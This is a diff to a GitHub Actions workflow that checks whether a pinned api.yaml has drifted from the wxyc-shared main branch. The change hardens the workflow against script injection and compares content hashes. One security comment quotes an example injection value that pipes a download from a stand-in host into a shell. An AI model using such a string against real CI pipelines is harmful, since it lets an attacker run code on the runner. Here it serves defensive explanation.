@@ -55,7 +55,7 @@ on:
         default: "main"
     outputs:
       drift:
-        description: "'true' if api.yaml's info.version differs between pinned-ref and wxyc-shared's current main, else 'false'"
+        description: "'true' if api.yaml's CONTENT (a SHA-256 comparison, not info.version -- see check-spec-drift.sh) differs between pinned-ref and wxyc-shared's current main, else 'false'"
         value: ${{ jobs.drift-check.outputs.drift }}
       current-sha:
         description: "wxyc-shared:main's current commit SHA at the time this workflow ran"
@@ -106,8 +106,34 @@ jobs:
       # (unlike `gh api repos/.../commits/main`), and raw.githubusercontent.com
       # serves public repo content unauthenticated -- the same fetch
       # scripts/generate-python-models.sh's own download fallback makes.
-      - name: Resolve wxyc-shared:main's SHA and both api.yaml versions
+      #
+      # SECURITY (PR #323 review): every `${{ }}` expression this workflow
+      # needs inside a shell script is passed through `env:` and referenced
+      # as a shell variable ("$PINNED_REF", not `${{ inputs.pinned-ref }}`
+      # inline in `run:`). GitHub Actions substitutes `${{ }}` textually
+      # BEFORE the shell parses the script, so an inline `${{
+      # inputs.pinned-ref }}` lets a caller-controlled string like
+      # `main"; curl evil.example | sh #` execute on the runner --
+      # actionlint does not flag `inputs.*` as untrusted, so this doesn't
+      # show up as a lint failure. Routing through `env:` makes the value a
+      # normal, safely-quoted shell variable instead: the shell sees
+      # literal text, not a fragment of the script it's about to parse.
+      # This workflow's blast radius if this went wrong would have been
+      # bounded (read-only token, no secrets) but the fix costs nothing and
+      # is the standard hardening for every reusable workflow.
+      #
+      # CONTENT AT THE RESOLVED SHA, NOT AT THE LITERAL `main` REF AGAIN
+      # (PR #323 review): fetching main's api.yaml via a second
+      # `.../wxyc-shared/main/api.yaml` request, after already resolving
+      # CURRENT_SHA via `git ls-remote`, is a race -- a merge landing
+      # between the two requests makes the reported current-sha and the
+      # fetched/hashed content come from different commits. Fetching
+      # `.../wxyc-shared/${CURRENT_SHA}/api.yaml` instead removes the race:
+      # the SHA in the output is provably the SHA whose content was hashed.
+      - name: Resolve wxyc-shared:main's SHA and both api.yaml copies
         id: fetch
+        env:
+          PINNED_REF: ${{ inputs.pinned-ref }}
         run: |
           set -euo pipefail
           CURRENT_SHA="$(git ls-remote https://github.com/WXYC/wxyc-shared.git main | cut -f1)"
@@ -115,19 +141,44 @@ jobs:
             echo "::error::could not resolve WXYC/wxyc-shared:main's SHA via git ls-remote"
             exit 1
           fi
-          CURRENT_VERSION="$(curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/main/api.yaml" | grep -m1 '^  version:' | awk '{print $2}')"
-          PINNED_VERSION="$(curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/${{ inputs.pinned-ref }}/api.yaml" | grep -m1 '^  version:' | awk '{print $2}')"
+
+          CURRENT_FILE="$(mktemp)"
+          PINNED_FILE="$(mktemp)"
+          # Fetch main's api.yaml AT THE SHA JUST RESOLVED (not the moving
+          # `main` ref a second time -- see the step comment above).
+          curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/${CURRENT_SHA}/api.yaml" -o "$CURRENT_FILE"
+          curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/${PINNED_REF}/api.yaml" -o "$PINNED_FILE"
+
+          CURRENT_VERSION="$(grep -m1 '^  version:' "$CURRENT_FILE" | awk '{print $2}')"
+          PINNED_VERSION="$(grep -m1 '^  version:' "$PINNED_FILE" | awk '{print $2}')"
+
+          if command -v sha256sum >/dev/null 2>&1; then
+            CURRENT_SHA256="$(sha256sum "$CURRENT_FILE" | awk '{print $1}')"
+            PINNED_SHA256="$(sha256sum "$PINNED_FILE" | awk '{print $1}')"
+          else
+            CURRENT_SHA256="$(shasum -a 256 "$CURRENT_FILE" | awk '{print $1}')"
+            PINNED_SHA256="$(shasum -a 256 "$PINNED_FILE" | awk '{print $1}')"
+          fi
+          rm -f "$CURRENT_FILE" "$PINNED_FILE"
+
           {
             echo "current-sha=$CURRENT_SHA"
             echo "current-version=$CURRENT_VERSION"
             echo "pinned-version=$PINNED_VERSION"
+            echo "current-sha256=$CURRENT_SHA256"
+            echo "pinned-sha256=$PINNED_SHA256"
           } >> "$GITHUB_OUTPUT"
 
-      - name: Compare pinned api.yaml version against main
+      - name: Compare pinned api.yaml content against main
         id: compare
+        env:
+          PINNED_REF: ${{ inputs.pinned-ref }}
+          PINNED_VERSION: ${{ steps.fetch.outputs.pinned-version }}
+          PINNED_SHA256: ${{ steps.fetch.outputs.pinned-sha256 }}
+          CURRENT_SHA: ${{ steps.fetch.outputs.current-sha }}
+          CURRENT_VERSION: ${{ steps.fetch.outputs.current-version }}
+          CURRENT_SHA256: ${{ steps.fetch.outputs.current-sha256 }}
         run: |
           bash wxyc-shared/scripts/check-spec-drift.sh \
-            "${{ inputs.pinned-ref }}" \
-            "${{ steps.fetch.outputs.pinned-version }}" \
-            "${{ steps.fetch.outputs.current-sha }}" \
-            "${{ steps.fetch.outputs.current-version }}"
+            "$PINNED_REF" "$PINNED_VERSION" "$PINNED_SHA256" \
+            "$CURRENT_SHA" "$CURRENT_VERSION" "$CURRENT_SHA256"
